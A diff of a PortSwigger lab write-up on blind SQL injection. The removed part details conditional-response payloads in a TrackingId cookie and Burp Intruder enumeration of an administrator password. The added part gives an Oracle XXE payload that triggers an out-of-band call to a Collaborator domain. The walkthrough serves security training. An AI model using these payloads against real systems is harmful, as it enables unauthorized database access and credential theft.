@@ -1,107 +1,22 @@
 
-### Blind SQL injection with conditional responses : PRACTITIONER
+### Blind SQL injection with out-of-band interaction : PRACTITIONER
 
 ---
 
-> Blind sql injection, so must play with the backend. This includes the coookies. 
-> There is a TrackingId cookie which we can try to exploit using SQL injection.
-> The SQL statement that checks for this cookie looks somewhat like this:
+Since the application executes the SQL asynchronously and has no effect on the application response, we can try and trigger and out of band network interaction.
+
+> Capturing a `GET` request using BURPSUITE PROXY HTTP history, we see the `TrackingId` cookie that is vulnerable.
+
+![](./screenshots/lab17-1.png)
+
+Opening the [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) and trying the different out of band payloads and placing them in the `TrackingId` cookie with the burp collaborator domain.
 ```
-SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'HNgNNAq7tdrY9x17'
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://oa2ta7v39e81tpe1t3gofuf07rdi19py.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
+- Should be URL encoded, and uses the `http://` protocol.
 
-> We know that our TrackingId cookie's value exists already, so if we attempt to reload the page or visit another page on the site, it will show the 'Welcome Back' message. 
-> Try changing the TrackingId cookie value to a different one, if the 'Welcome Back' message doesn't appear, then we know that this value of the cookie doesn't exist.
-> Therefore, we know that the website shows 'Welcome Back' in true conditions, and doesn't in false conditions.
+Opening collaborator and polling we see the following DNS requests, confirming that we executed SQL statements.
 
-> To try to exploit it using SQL injections, try adding a payload that will also evaluate to true and another that will evaluate to false and check if the behaviour is still the same. If it is, then we can proceed.
-> We will add a payload at the end of the query above, we are injecting it inside the TrackingId value.
-```
-HNgNNAq7tdrY9x17' AND 1=1 --'
-```
-> We know that this must evaluate to true. If we see the welcome back message, then we know that there is a blind injection.
-
-> We see the welcome back message as expected, now trying a false condition.
-```
-HNgNNAq7tdrY9x17' AND 1=2 --'
-```
-> We don't see it, hence, we can proceed knowing that for true SQL expressions we see the welcome back message, otherwise we dont.
-
-> We can use that to check if there is a users table in the database. We write a query that checks if this table exists, if it does, then we will see the welcome back message.
-```
-HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --'
-```
-> What this does is that it returns the value x for every row in the table users. If the table doesn't exist, or has no rows, then the expression will evaluate to false. We use the LIMIT 1 to check only for 1 row.
-> If the welcome back message is produced, then this table exists as there is at least 1 row in it.
-
-> As the welcome back text is produced, then we know that this table exists. We now need to enumerate for the administrator.
-```
-HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator')='administrator' --'
-```
-> What this query does is that selects a user from the users table whose username is administrator. If it exists, it will return it, and we use this expression to return true or false.
-
-> Since the welcome back message was greeted, then we know that the username 'administrator' exists for the admin user.
-> Now we need to enumerate the password.
-
-> First, we enumerate the password length.
-```
-HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > 1 )='administrator' --'
-```
-> We know from the previous query that the administrator username exists, so we can compound in it another AND expression to check for the length of the password. 
-> Keep adding in the length until we don't recieve the welcome back message, and by then we will know the length of the password.
-
-> Or, instead of doing it manually, we can do it via BURPSUITE INTRUDER sniper attack. Put the placeholders at the length and keep sending requests until the right length is recieved.
-
-![intruder](./screenshots/intruder.png)
-> We then set the payload to be simply decimals from 1 to a large number.
-
-![payload](./screenshots/payload.png)
-> Then we start the attack and observe the different results. 
-
-![lengthResponse](./screenshots/lengthresponse.png)
-
-> We can use the length of the request and see that for a request with the welcome back message produced it is of size 11530, but for one without the message it is 11469.
-> Check the first instance of 11469, and see that it is indeed the size of our password as we used the `>` operator.
-
-> Now that we know our password has a length of 20, we can now enumerate the letters of that password. We can do this query on each position in the password and for each alphanumeric character until we get all the responses with the welcome back message.
-```
-HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a' --'
-```
-> Check for the first character of the password if it is 'a' or not. If we get a welcome back message then it is a and we move on to the next character. 
-> If we don't get the welcome back message, then we try the next character.
-
-> This attack can be done using BURPSUITE INTRUDER clusterbomb attack.
-> Set the different payload positions to the index in the password and the letter at that index.
-
-![clusterbomb](./screenshots/clusterbomb.png)
-
-> The first payload being the index will be the numbers list from 1 to 20.
-> The second payload being the character will be the alphanumeric list containg a-z and 0-9.
-
-![bruteforcer](./screenshots/payloadcluster.png)
-
-> Start the attack, and check the lengths as done above. 
-> Combine the letters at the different positions and then login as administrator to complete the lab.
-
-1 - v
-2 - t
-3 - p
-4 - g
-5 - w
-6 - 4
-7 - u
-8 - g
-9 - v
-10 - v
-11 - u
-12 - r
-13 - m
-14 - c
-15 - x
-16 - n
-17 - q
-18 - s
-19 - c
-20 - 9
+![](./screenshots/lab17-2.png)
 
 ---
